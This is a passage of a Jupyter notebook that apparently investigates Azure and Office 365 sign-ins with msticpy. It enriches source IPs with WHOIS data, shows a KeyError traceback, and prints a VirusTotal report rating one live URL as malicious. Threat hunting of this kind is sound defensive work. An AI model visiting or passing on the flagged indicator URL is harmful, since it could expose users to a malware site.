       "      <td>[{'cidr': '24.12.0.0/14', 'handle': 'NET-24-12-0-0-1', 'name': 'CHICAGO-CPE-1', 'startAddress': ...</td>\n",
       "      <td>{'asn': '7922', 'query': '24.13.212.221', 'asn_cidr': '24.0.0.0/12', 'asn_country_code': 'US', '...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>2025-08-15 19:07:29.645233</td>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>2025-08-15 19:07:29.645233</td>\n",
       "      <td>7922</td>\n",
       "      <td>24.16.133.227</td>\n",
       "      <td>24.16.0.0/13</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2003-10-06</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '24.16.0.0/14', 'handle': 'NET-24-16-0-0-2', 'name': 'WASHINGTON-9', 'startAddress': '...</td>\n",
       "      <td>{'asn': '7922', 'query': '24.16.133.227', 'asn_cidr': '24.16.0.0/13', 'asn_country_code': 'US', ...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>73.226.223.252</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>2025-08-15 17:40:20.627233</td>\n",
       "      <td>73.226.223.252</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>2025-08-15 17:40:20.627233</td>\n",
       "      <td>7922</td>\n",
       "      <td>73.226.223.252</td>\n",
       "      <td>73.0.0.0/8</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2005-04-19</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '73.0.0.0/8', 'handle': 'NET-73-0-0-0-1', 'name': 'CABLE-1', 'startAddress': '73.0.0.0...</td>\n",
       "      <td>{'asn': '7922', 'query': '73.226.223.252', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', '...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>73.35.204.105</td>\n",
       "      <td>Office 365 Exchange Online</td>\n",
       "      <td>2025-08-15 15:56:19.558233</td>\n",
       "      <td>73.35.204.105</td>\n",
       "      <td>Office 365 Exchange Online</td>\n",
       "      <td>2025-08-15 15:56:19.558233</td>\n",
       "      <td>7922</td>\n",
       "      <td>73.35.204.105</td>\n",
       "      <td>73.0.0.0/8</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2005-04-19</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "      <td>[{'cidr': '73.35.128.0/17', 'handle': 'NET-73-35-128-0-1', 'name': 'SEATTLE-32', 'startAddress':...</td>\n",
       "      <td>{'asn': '7922', 'query': '73.35.204.105', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', 'a...</td>\n",
       "      <td>COMCAST-7922, US</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>136.55.145.135</td>\n",
       "      <td>Office 365 SharePoint Online</td>\n",
       "      <td>2025-08-15 12:22:00.161233</td>\n",
       "      <td>136.55.145.135</td>\n",
       "      <td>Office 365 SharePoint Online</td>\n",
       "      <td>2025-08-15 12:22:00.161233</td>\n",
       "      <td>16591</td>\n",
       "      <td>136.55.145.135</td>\n",
       "      <td>136.32.0.0/11</td>\n",
       "      <td>US</td>\n",
       "      <td>arin</td>\n",
       "      <td>2015-10-06</td>\n",
       "      <td>GOOGLE-FIBER, US</td>\n",
       "      <td>[{'cidr': '136.32.0.0/11', 'handle': 'NET-136-32-0-0-1', 'name': 'GOOGLE-FIBER', 'startAddress':...</td>\n",
       "      <td>{'asn': '16591', 'query': '136.55.145.135', 'asn_cidr': '136.32.0.0/11', 'asn_country_code': 'US...</td>\n",
       "      <td>GOOGLE-FIBER, US</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    IPAddress_src            AppDisplayName_src          TimeGenerated_src  \\\n",
       "0   24.13.212.221                  Azure Portal 2025-08-15 18:53:49.241233   \n",
       "1   24.16.133.227                  Azure Portal 2025-08-15 19:07:29.645233   \n",
       "2  73.226.223.252                  Azure Portal 2025-08-15 17:40:20.627233   \n",
       "3   73.35.204.105    Office 365 Exchange Online 2025-08-15 15:56:19.558233   \n",
       "4  136.55.145.135  Office 365 SharePoint Online 2025-08-15 12:22:00.161233   \n",
       "\n",
       "    IPAddress_res            AppDisplayName_res          TimeGenerated_res  \\\n",
       "0   24.13.212.221                  Azure Portal 2025-08-15 18:53:49.241233   \n",
       "1   24.16.133.227                  Azure Portal 2025-08-15 19:07:29.645233   \n",
       "2  73.226.223.252                  Azure Portal 2025-08-15 17:40:20.627233   \n",
       "3   73.35.204.105    Office 365 Exchange Online 2025-08-15 15:56:19.558233   \n",
       "4  136.55.145.135  Office 365 SharePoint Online 2025-08-15 12:22:00.161233   \n",
       "\n",
       "     asn           query       asn_cidr asn_country_code asn_registry  \\\n",
       "0   7922   24.13.212.221    24.0.0.0/12               US         arin   \n",
       "1   7922   24.16.133.227   24.16.0.0/13               US         arin   \n",
       "2   7922  73.226.223.252     73.0.0.0/8               US         arin   \n",
       "3   7922   73.35.204.105     73.0.0.0/8               US         arin   \n",
       "4  16591  136.55.145.135  136.32.0.0/11               US         arin   \n",
       "\n",
       "     asn_date   asn_description  \\\n",
       "0  2003-10-06  COMCAST-7922, US   \n",
       "1  2003-10-06  COMCAST-7922, US   \n",
       "2  2005-04-19  COMCAST-7922, US   \n",
       "3  2005-04-19  COMCAST-7922, US   \n",
       "4  2015-10-06  GOOGLE-FIBER, US   \n",
       "\n",
       "                                                                                                  nets  \\\n",
       "0  [{'cidr': '24.12.0.0/14', 'handle': 'NET-24-12-0-0-1', 'name': 'CHICAGO-CPE-1', 'startAddress': ...   \n",
       "1  [{'cidr': '24.16.0.0/14', 'handle': 'NET-24-16-0-0-2', 'name': 'WASHINGTON-9', 'startAddress': '...   \n",
       "2  [{'cidr': '73.0.0.0/8', 'handle': 'NET-73-0-0-0-1', 'name': 'CABLE-1', 'startAddress': '73.0.0.0...   \n",
       "3  [{'cidr': '73.35.128.0/17', 'handle': 'NET-73-35-128-0-1', 'name': 'SEATTLE-32', 'startAddress':...   \n",
       "4  [{'cidr': '136.32.0.0/11', 'handle': 'NET-136-32-0-0-1', 'name': 'GOOGLE-FIBER', 'startAddress':...   \n",
       "\n",
       "                                                                                             WhoIsData  \\\n",
       "0  {'asn': '7922', 'query': '24.13.212.221', 'asn_cidr': '24.0.0.0/12', 'asn_country_code': 'US', '...   \n",
       "1  {'asn': '7922', 'query': '24.16.133.227', 'asn_cidr': '24.16.0.0/13', 'asn_country_code': 'US', ...   \n",
       "2  {'asn': '7922', 'query': '73.226.223.252', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', '...   \n",
       "3  {'asn': '7922', 'query': '73.35.204.105', 'asn_cidr': '73.0.0.0/8', 'asn_country_code': 'US', 'a...   \n",
       "4  {'asn': '16591', 'query': '136.55.145.135', 'asn_cidr': '136.32.0.0/11', 'asn_country_code': 'US...   \n",
       "\n",
       "     AsnDescription  \n",
       "0  COMCAST-7922, US  \n",
       "1  COMCAST-7922, US  \n",
       "2  COMCAST-7922, US  \n",
       "3  COMCAST-7922, US  \n",
       "4  GOOGLE-FIBER, US  "
      ]
     },
     "execution_count": 70,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "IpAddress.whois(logons_subset[[\"IPAddress\", \"AppDisplayName\", \"TimeGenerated\"]], column=\"IPAddress\", join=\"left\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "f0394f8b",
   "metadata": {},
   "outputs": [
    {
     "ename": "KeyError",
     "evalue": "\"['TimeGenerated'] not in index\"",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mKeyError\u001b[39m                                  Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[72]\u001b[39m\u001b[32m, line 5\u001b[39m\n\u001b[32m      1\u001b[39m \u001b[43mIpAddress\u001b[49m\u001b[43m.\u001b[49m\u001b[43mwhois\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m      2\u001b[39m \u001b[43m    \u001b[49m\u001b[43mlogons_subset\u001b[49m\u001b[43m[\u001b[49m\u001b[43m[\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mIPAddress\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mAppDisplayName\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mTimeGenerated\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m]\u001b[49m\u001b[43m]\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m      3\u001b[39m \u001b[43m    \u001b[49m\u001b[43mcolumn\u001b[49m\u001b[43m=\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mIPAddress\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\n\u001b[32m      4\u001b[39m \u001b[43m    \u001b[49m\u001b[43mjoin\u001b[49m\u001b[43m=\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mleft\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\n\u001b[32m----> \u001b[39m\u001b[32m5\u001b[39m \u001b[43m)\u001b[49m\u001b[43m.\u001b[49m\u001b[43mmp_plot\u001b[49m\u001b[43m.\u001b[49m\u001b[43mtimeline\u001b[49m\u001b[43m(\u001b[49m\u001b[43mgroup_by\u001b[49m\u001b[43m=\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43masn_description\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python313\\site-packages\\msticpy\\vis\\mp_pandas_plot.py:105\u001b[39m, in \u001b[36mMsticpyPlotAccessor.timeline\u001b[39m\u001b[34m(self, **kwargs)\u001b[39m\n\u001b[32m     37\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34mtimeline\u001b[39m(\u001b[38;5;28mself\u001b[39m, **kwargs) -> LayoutDOM:\n\u001b[32m     38\u001b[39m \u001b[38;5;250m    \u001b[39m\u001b[33;03m\"\"\"\u001b[39;00m\n\u001b[32m     39\u001b[39m \u001b[33;03m    Display a timeline of events.\u001b[39;00m\n\u001b[32m     40\u001b[39m \n\u001b[32m   (...)\u001b[39m\u001b[32m    103\u001b[39m \n\u001b[32m    104\u001b[39m \u001b[33;03m    \"\"\"\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m105\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mdisplay_timeline\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_df\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python313\\site-packages\\msticpy\\vis\\timeline.py:223\u001b[39m, in \u001b[36mdisplay_timeline\u001b[39m\u001b[34m(data, time_column, source_columns, **kwargs)\u001b[39m\n\u001b[32m    220\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m _display_timeline_dict(data=aggr_data, param=param)\n\u001b[32m    222\u001b[39m     \u001b[38;5;66;03m# Create a dictionary from a grouped or simple series\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m223\u001b[39m     series_dict = \u001b[43m_create_dict_from_grouping\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    224\u001b[39m \u001b[43m        \u001b[49m\u001b[43mdata\u001b[49m\u001b[43m=\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    225\u001b[39m \u001b[43m        \u001b[49m\u001b[43msource_columns\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparam\u001b[49m\u001b[43m.\u001b[49m\u001b[43msource_columns\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    226\u001b[39m \u001b[43m        \u001b[49m\u001b[43mtime_column\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparam\u001b[49m\u001b[43m.\u001b[49m\u001b[43mtime_column\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    227\u001b[39m \u001b[43m        \u001b[49m\u001b[43mgroup_by\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparam\u001b[49m\u001b[43m.\u001b[49m\u001b[43mgroup_by\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    228\u001b[39m \u001b[43m        \u001b[49m\u001b[43mcolor\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparam\u001b[49m\u001b[43m.\u001b[49m\u001b[43mcolor\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    229\u001b[39m \u001b[43m        \u001b[49m\u001b[43msize\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparam\u001b[49m\u001b[43m.\u001b[49m\u001b[43msize\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    230\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    231\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m _display_timeline_dict(data=series_dict, param=param)\n\u001b[32m    233\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(data, \u001b[38;5;28mdict\u001b[39m):\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python313\\site-packages\\msticpy\\vis\\timeline.py:482\u001b[39m, in \u001b[36m_create_dict_from_grouping\u001b[39m\u001b[34m(data, source_columns, time_column, group_by, color, size)\u001b[39m\n\u001b[32m    480\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m group_by:\n\u001b[32m    481\u001b[39m     data_columns.add(group_by)\n\u001b[32m--> \u001b[39m\u001b[32m482\u001b[39m     grouped_data = \u001b[43mdata\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;28;43mlist\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43mdata_columns\u001b[49m\u001b[43m)\u001b[49m\u001b[43m]\u001b[49m.groupby(group_by)\n\u001b[32m    484\u001b[39m     series_count = \u001b[38;5;28mlen\u001b[39m(grouped_data)\n\u001b[32m    485\u001b[39m     colors, palette_size = get_color_palette(series_count)\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python313\\site-packages\\pandas\\core\\frame.py:4113\u001b[39m, in \u001b[36mDataFrame.__getitem__\u001b[39m\u001b[34m(self, key)\u001b[39m\n\u001b[32m   4111\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m is_iterator(key):\n\u001b[32m   4112\u001b[39m         key = \u001b[38;5;28mlist\u001b[39m(key)\n\u001b[32m-> \u001b[39m\u001b[32m4113\u001b[39m     indexer = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mcolumns\u001b[49m\u001b[43m.\u001b[49m\u001b[43m_get_indexer_strict\u001b[49m\u001b[43m(\u001b[49m\u001b[43mkey\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mcolumns\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m)\u001b[49m[\u001b[32m1\u001b[39m]\n\u001b[32m   4115\u001b[39m \u001b[38;5;66;03m# take() does not accept boolean indexers\u001b[39;00m\n\u001b[32m   4116\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mgetattr\u001b[39m(indexer, \u001b[33m\"\u001b[39m\u001b[33mdtype\u001b[39m\u001b[33m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m) == \u001b[38;5;28mbool\u001b[39m:\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python313\\site-packages\\pandas\\core\\indexes\\base.py:6212\u001b[39m, in \u001b[36mIndex._get_indexer_strict\u001b[39m\u001b[34m(self, key, axis_name)\u001b[39m\n\u001b[32m   6209\u001b[39m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m   6210\u001b[39m     keyarr, indexer, new_indexer = \u001b[38;5;28mself\u001b[39m._reindex_non_unique(keyarr)\n\u001b[32m-> \u001b[39m\u001b[32m6212\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_raise_if_missing\u001b[49m\u001b[43m(\u001b[49m\u001b[43mkeyarr\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mindexer\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43maxis_name\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   6214\u001b[39m keyarr = \u001b[38;5;28mself\u001b[39m.take(indexer)\n\u001b[32m   6215\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(key, Index):\n\u001b[32m   6216\u001b[39m     \u001b[38;5;66;03m# GH 42790 - Preserve name from an Index\u001b[39;00m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python313\\site-packages\\pandas\\core\\indexes\\base.py:6264\u001b[39m, in \u001b[36mIndex._raise_if_missing\u001b[39m\u001b[34m(self, key, indexer, axis_name)\u001b[39m\n\u001b[32m   6261\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mKeyError\u001b[39;00m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33mNone of [\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mkey\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m] are in the [\u001b[39m\u001b[38;5;132;01m{\u001b[39;00maxis_name\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m]\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m   6263\u001b[39m not_found = \u001b[38;5;28mlist\u001b[39m(ensure_index(key)[missing_mask.nonzero()[\u001b[32m0\u001b[39m]].unique())\n\u001b[32m-> \u001b[39m\u001b[32m6264\u001b[39m \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mKeyError\u001b[39;00m(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mnot_found\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m not in index\u001b[39m\u001b[33m\"\u001b[39m)\n",
      "\u001b[31mKeyError\u001b[39m: \"['TimeGenerated'] not in index\""
     ]
    }
   ],
   "source": [
    "IpAddress.whois(\n",
    "    logons_subset[[\"IPAddress\", \"AppDisplayName\", \"TimeGenerated\"]],\n",
    "    column=\"IPAddress\",\n",
    "    join=\"left\"\n",
    ").mp_plot.timeline(group_by=\"asn_description\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "c7011323",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "53ff4d97b4454003a7fd16553afca92b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Observables processed:   0%|          | 0/2 [00:00<?, ?obs/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d522fb6d370e490088a760ad8eae80c7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value=\"http://85.214.149.236:443/sugarcrm/themes/default/images/ type: url         (sev: h…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h2 style='border: 1px solid;background-color: DarkGray; padding: 6px'>http://85.214.149.236:443/sugarcrm/themes/default/images/</h2><h3 style='background-color: SteelBlue; padding: 6px'>Type: 'url', Provider: VirusTotal, severity: high</h3><h4>Details</h4>\n",
       "<style>\n",
       "    .tb_ti_res {border-collapse: collapse; width: 60%; border: 1px solid #ddd !important;}\n",
       "    .cell_ti {border: 1px solid #ddd !important;\n",
       "        text-align: left !important; padding: 5px !important; height: 12px}\n",
       "    .cell_ti_first {border: 1px solid #ddd !important; width: 25%;\n",
       "        text-align: left !important; padding: 5px !important; height: 12px}\n",
       "</style>\n",
       "<table class='tb_ti_res'><tr class='cell_ti'><td class='cell_ti_first'>VirusTotal</td><tr class='cell_ti'><td class='cell_ti_first'>verbose_msg</td><td class='cell_ti'>Scan finished, scan information embedded in this object</td></tr><tr class='cell_ti'><td class='cell_ti_first'>response_code</td><td class='cell_ti'>1</td></tr><tr class='cell_ti'><td class='cell_ti_first'>positives</td><td class='cell_ti'>9</td></tr><tr class='cell_ti'><td class='cell_ti_first'>resource</td><td class='cell_ti'>http://85.214.149.236:443/sugarcrm/themes/default/images/</td></tr><tr class='cell_ti'><td class='cell_ti_first'>permalink</td><td class='cell_ti'>https://www.virustotal.com/gui/url/5cfb347b4631f015338e0c143de3b67926e7dc53b048e3dcc927d78bd0f40b55/detection/u-5cfb347b4631f015338e0c143de3b67926e7dc53b048e3dcc927d78bd0f40b55-1724402990</td></tr></tr></table><h4>Reference: </h4><a href='https://www.virustotal.com/vtapi/v2/url/report'>https://www.virustotal.com/vtapi/v2/url/report</a><br><hr><h4>Raw Results</h4>\n",
       "        <details>\n",
       "        <summary> <u>Raw results from provider...</u></summary>\n",
       "        <pre  style=\"font-size:11px\">{'filescan_id':&nbsp;None,<br>&nbsp;'permalink':&nbsp;'https://www.virustotal.com/gui/url/5cfb347b4631f015338e0c143de3b67926e7dc53b048e3dcc927d78bd0f40b55/detection/u-5cfb347b4631f015338e0c143de3b67926e7dc53b048e3dcc927d78bd0f40b55-1724402990',<br>&nbsp;'positives':&nbsp;9,<br>&nbsp;'resource':&nbsp;'http://85.214.149.236:443/sugarcrm/themes/default/images/',<br>&nbsp;'response_code':&nbsp;1,<br>&nbsp;'scan_date':&nbsp;'2024-08-23&nbsp;08:49:50',<br>&nbsp;'scan_id':&nbsp;'5cfb347b4631f015338e0c143de3b67926e7dc53b048e3dcc927d78bd0f40b55-1724402990',<br>&nbsp;'scans':&nbsp;{'0xSI_f33d':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ADMINUSLabs':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'AILabs&nbsp;(MONITORAPP)':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Abusix':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Acronis':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'AlienVault':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'AlphaSOC':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Antiy-AVL':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malicious&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'ArcSight&nbsp;Threat&nbsp;Intelligence':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Artists&nbsp;Against&nbsp;419':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'AutoShun':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Axur':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Bfore.Ai&nbsp;PreCrime':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'BitDefender':&nbsp;{'detected':&nbsp;True,&nbsp;'result':&nbsp;'malware&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Bkav':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'unrated&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'BlockList':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Blueliv':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'CINS&nbsp;Army':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'CMC&nbsp;Threat&nbsp;Intelligence':&nbsp;{'detected':&nbsp;False,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'CRDF':&nbsp;{'detected':&nbsp;False,&nbsp;'result':&nbsp;'clean&nbsp;site'},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n